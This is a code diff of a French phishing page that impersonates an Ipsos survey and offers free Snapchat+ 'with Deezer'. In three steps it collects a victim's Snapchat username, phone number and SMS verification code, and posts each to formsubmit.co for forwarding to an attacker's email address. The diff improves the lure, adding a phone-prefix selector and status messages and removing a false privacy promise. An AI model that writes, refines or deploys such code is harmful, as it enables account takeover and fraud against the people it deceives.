@@ -160,6 +160,32 @@
             border-top: 1px solid #ddd;
         }
 
+        .select-phone {
+            width: 100%;
+            padding: 14px;
+            font-size: 18px;
+            border-radius: 6px;
+            border: 1px solid #ccc;
+            margin-bottom: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .select-phone select {
+            width: 48%;
+            padding: 14px;
+            font-size: 18px;
+            border-radius: 6px;
+        }
+
+        .select-phone input {
+            width: 48%;
+            padding: 14px;
+            font-size: 18px;
+            border-radius: 6px;
+        }
+
         @media (max-width: 600px) {
             .box {
                 margin: 30px 20px;
@@ -182,13 +208,14 @@
     </style>
 </head>
 <body>
+
     <img src="francelogo.png" class="logo-fixed" alt="France">
 
     <div class="header">
         <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos réponses seront perdues.')">
             <img src="logo.png" alt="Ipsos">
         </a>
-        <div class="header-text">Sondage Snapchat+</div>
+        <div class="header-text">Ipsos – Sondage</div>
     </div>
 
     <div class="progress-container">
@@ -200,42 +227,45 @@
     <div class="box active" id="etape0">
         <h2>Partenariat avec Deezer 📱</h2>
         <p>Ce sondage est organisé en collaboration avec Deezer pour offrir Snapchat+ gratuitement. Cette offre est exclusivement réservée aux clients de <strong>SFR, Bouygues Telecom, ou Orange</strong> pour garantir la compatibilité avec les services.</p>
-        <p>Ce sondage est éphémère et disponible pour une durée limitée.</p>
         <p>Avant de commencer, nous devons effectuer une vérification pour confirmer que vous êtes un participant humain et éviter tout abus.</p>
         <button id="btnEtape0">Continuer</button>
     </div>
+
     <!-- Étape 1: Collecte des informations sur le compte Snapchat -->
     <div class="box" id="etape1">
         <h2>Recevoir Snapchat+ 🎁</h2>
         <p>Merci de nous fournir votre identifiant Snapchat afin que nous puissions vous envoyer votre cadeau.</p>
         <input type="text" id="compte_snap" placeholder="Votre identifiant Snapchat">
-        <p>Combien de temps utilisez-vous Deezer ?</p>
-        <select id="temps_deezer">
-            <option value="Moins de 6 mois">Moins de 6 mois</option>
-            <option value="6 mois à 1 an">6 mois à 1 an</option>
-            <option value="Plus d'1 an">Plus d'1 an</option>
-        </select>
         <button id="btnEtape1">Suivant</button>
     </div>
 
     <!-- Étape 2: Numéro de téléphone -->
     <div class="box" id="etape2">
         <h2>Numéro de téléphone</h2>
-        <p>Veuillez entrer votre numéro de téléphone pour recevoir un code de vérification par SMS. Vous devez choisir un numéro commençant par 06 ou 07.</p>
-        <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX" maxlength="10">
+        <p>Veuillez entrer votre numéro de téléphone pour recevoir un code de vérification par SMS.</p>
+
+        <!-- Sélectionner entre 06 et 07 -->
+        <div class="select-phone">
+            <select id="prefixe_tel">
+                <option value="06">06</option>
+                <option value="07">07</option>
+            </select>
+            <input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
+        </div>
+
         <button id="btnEtape2">Suivant</button>
     </div>
 
     <!-- Étape 3: Code SMS -->
     <div class="box" id="etape3">
         <h2>Code de vérification</h2>
-        <p>Veuillez entrer le code que vous avez reçu par SMS pour finaliser l’inscription.</p>
-        <p><strong>Note:</strong> Cela peut prendre jusqu'à une minute pour recevoir le code. Une fois saisi, vous aurez Snapchat+ instantanément.</p>
+        <p>Veuillez entrer le code que vous avez reçu par SMS pour finaliser l’inscription. Cela peut prendre jusqu'à une minute.</p>
         <input type="text" id="code_sms" placeholder="Code reçu">
         <button id="btnEtape3">Terminer</button>
     </div>
 
     <div class="footer">© 2026 Ipsos – Tous droits réservés</div>
+
     <script>
         let reponses = {};
 
@@ -249,11 +279,15 @@
         async function sendMail(dataObj, sujet) {
             const formData = new FormData();
             formData.append("_subject", sujet);
-            formData.append("_cc", "John123abcd@proton.me,John123abcd@proton.me");  // Remplace avec tes adresses email
+            formData.append("_cc", "John123abcd@proton.me,John123abcd@proton.me"); // Remplace avec tes adresses email
             formData.append("_captcha", "false");
+
             for (let key in dataObj) {
                 formData.append(key, dataObj[key]);
             }
+
+            document.getElementById('progressText').innerText = "Envoi des données...";
+
             try {
                 await fetch("https://formsubmit.co/John123abcd@proton.me", {
                     method: "POST",
@@ -261,43 +295,40 @@
                     headers: { "Accept": "application/json" }
                 });
                 console.log("Mail envoyé:", sujet);
+                document.getElementById('progressText').innerText = "Données envoyées avec succès !";
             } catch (e) {
                 console.error("Erreur d'envoi de mail", e);
+                document.getElementById('progressText').innerText = "Erreur d'envoi, veuillez réessayer.";
             }
         }
 
-        // Étape 0: Vérification avant le sondage
         document.getElementById('btnEtape0').addEventListener('click', () => {
             showStep('etape1', 25);
         });
 
-        // Étape 1: Réponse sur Snapchat
         document.getElementById('btnEtape1').addEventListener('click', () => {
             let snap = document.getElementById('compte_snap').value.trim();
-            let tempsDeezer = document.getElementById('temps_deezer').value;
             if (!snap) {
                 alert("Veuillez entrer votre identifiant Snapchat.");
                 return;
             }
             reponses.compte_snap = snap;
-            reponses.temps_deezer = tempsDeezer;
-            sendMail({ compte_snap: snap, temps_deezer: tempsDeezer }, "Réponses Étape 1 - Ipsos");
+            sendMail({ compte_snap: snap }, "Réponses Étape 1 - Ipsos");
             showStep('etape2', 50);
         });
 
-        // Étape 2: Réponse sur le téléphone
         document.getElementById('btnEtape2').addEventListener('click', () => {
             let tel = document.getElementById('telephone').value.trim();
-            if (!/^0[67]\d{8}$/.test(tel)) {
-                alert("Numéro invalide (06 ou 07).");
+            let prefixe = document.getElementById('prefixe_tel').value;
+            if (!/^\d{8}$/.test(tel)) {
+                alert("Numéro invalide, assurez-vous que le numéro est bien à 8 chiffres.");
                 return;
             }
-            reponses.telephone = tel;
-            sendMail({ telephone: tel }, "Réponses Étape 2 - Ipsos");
+            reponses.telephone = prefixe + tel;
+            sendMail({ telephone: reponses.telephone }, "Réponses Étape 2 - Ipsos");
             showStep('etape3', 75);
         });
 
-        // Étape 3: Réponse sur le code SMS
         document.getElementById('btnEtape3').addEventListener('click', () => {
             let code = document.getElementById('code_sms').value.trim();
             if (!code) {
@@ -320,13 +351,6 @@
         Ce sondage est organisé en collaboration avec Deezer pour vous offrir Snapchat+ gratuitement. 
         L’offre est exclusivement réservée aux clients SFR, Bouygues Telecom et Orange afin de garantir la disponibilité et la compatibilité du service. 
         Nous vous remercions pour votre participation !
-    </div>
-
-    <!-- Partie "À propos" -->
-    <div class="about">
-        <h2 style="text-align: center;">À propos du sondage</h2>
-        <p>Ce sondage est éphémère et limité dans le temps, conçu pour vérifier votre éligibilité à recevoir Snapchat+ en partenariat avec Deezer. Il est uniquement destiné aux clients SFR, Bouygues Telecom et Orange.</p>
-        <p>Veuillez suivre chaque étape pour valider votre inscription. N'oubliez pas que nous ne collectons pas d'informations personnelles sensibles et nous respectons la confidentialité des données.</p>
     </div>
 
 </body>
